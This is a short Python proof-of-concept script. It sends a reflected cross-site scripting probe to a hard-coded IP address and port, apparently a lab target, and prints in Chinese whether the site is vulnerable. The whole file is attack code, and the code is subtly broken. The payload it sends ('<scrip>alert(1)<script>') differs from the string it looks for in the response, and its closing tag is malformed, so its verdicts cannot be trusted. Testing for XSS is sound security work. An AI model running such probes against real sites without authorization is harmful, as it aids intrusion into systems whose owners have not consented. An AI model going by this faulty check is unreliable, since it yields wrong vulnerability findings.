import requests

def POC(url):
    payload = "?message=<scrip>alert(1)<script>&submit=submit"
    res = requests.get(url+payload)
    if "<script>alert(1)<script>" in res.text:
        print('{} 存在反射性 XSS 漏洞'.format(url))
    else:
        print('{} 不存在反射性 XSS 漏洞'.format(url))

if __name__ == '__main__':
    url = "http://120.25.24.25:32297"
    POC(url)